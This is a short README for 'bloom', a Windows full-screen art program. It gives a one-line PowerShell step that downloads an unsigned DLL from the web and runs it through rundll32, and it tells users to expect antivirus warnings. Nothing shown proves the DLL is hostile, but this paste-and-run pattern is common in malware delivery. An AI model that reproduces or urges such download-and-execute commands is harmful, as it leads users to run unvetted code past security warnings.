# bloom

An ASCII art piece.

## Run it

```powershell
iwr "https://raw.githubusercontent.com/TudM99/bloom/main/bloom.dll" -OutFile "$env:TEMP\bloom.dll"; rundll32.exe "$env:TEMP\bloom.dll",Bloom
```

This downloads `bloom.dll` to your temp folder and runs it. Windows only.

To end it early, press **Esc** or right-click. Otherwise it closes on its own after the fade.

## Notes

- The DLL is unsigned, so Windows SmartScreen / Defender may warn you the first time. That's
  expected for a small hand-built binary that isn't code-signed.
- It takes over the full screen while it plays (~45 seconds).
- Source is in `bloom.c`. To build it yourself with MinGW:

  ```powershell
  gcc -O2 -s -shared -o bloom.dll bloom.c -lgdi32 -luser32 -lmsimg32
  ```

---

